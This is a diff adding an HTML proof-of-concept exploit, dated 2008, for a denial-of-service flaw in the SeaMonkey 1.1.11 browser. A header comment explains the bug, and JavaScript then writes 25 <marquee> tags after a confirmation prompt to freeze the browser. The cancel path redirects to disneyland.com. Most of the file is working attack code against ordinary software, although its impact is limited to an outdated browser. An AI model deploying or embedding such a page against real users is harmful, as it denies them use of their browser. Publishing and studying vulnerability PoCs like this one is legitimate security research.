@@ -1,0 +1,69 @@
+&lt;!--
+
+ Title: SeaMonkey 1.1.11 Remote Denial of Service Exploit PoC
+
+ Summary: Web-browser, advanced e-mail and newsgroup client,
+ IRC chat client, and HTML editing made simple - all your
+ Internet needs in one application.
+
+ Product web page: http://www.seamonkey-project.org/
+
+ Desc: SeaMonkey suffers from a remote denial of service
+ vulnerability (DoS), using a special html file with the
+ &lt;marquee&gt; tag multiple times (&gt;24). Successfully exploiting
+ these issues allows remote attackers to cause the application
+ to freeze, denying service to legitimate users.
+
+ Tested on Microsoft Windows XP SP2 (English)
+
+ Vulnerability discovered by: Gjoko &#039;LiquidWorm&#039; Krstic
+
+ liquidworm [t00t] gmail [d0t] com
+
+ http://www.zeroscience.org
+
+ 08.09.2008
+ 
+--&gt;
+
+&lt;html&gt;
+
+&lt;title&gt;SeaMonkey 1.1.11 Remote Denial of Service Exploit&lt;/title&gt;
+
+&lt;head&gt;
+
+&lt;body&gt;
+
+&lt;br /&gt;&lt;br /&gt;&lt;br /&gt;&lt;br /&gt;
+&lt;br /&gt;&lt;br /&gt;&lt;br /&gt;&lt;br /&gt;
+&lt;br /&gt;&lt;br /&gt;&lt;br /&gt;&lt;br /&gt;
+
+&lt;center&gt;
+
+&lt;script type=&quot;text/javascript&quot;&gt;
+
+document.write(&quot;&lt;kbd&gt;Wooow Camel..!! WOW!&lt;/kbd&gt;&quot;);
+
+function t00t()
+{
+	for(i=0; i &lt; 25; i++)
+	{
+		document.write(&quot;&lt;marquee&gt;&quot;);
+	}
+}
+
+alert(&quot;SeaMonkey 1.1.11 Remote Denial of Service Exploit&quot;);
+
+var b0x = confirm(&quot;Press OK to start exploitation\nPress Cancel to skip exploitation&quot;);
+
+if (b0x == true) 
+{
+	t00t();
+}
+
+else {
+	alert(&quot;Allrighty Then!&quot;);
+	window.location.href = &quot;http://www.disneyland.com&quot;;
+     }
+ 
+&lt;/script&gt; &lt;/center&gt; &lt;/body&gt; &lt;/head&gt; &lt;/html&gt;
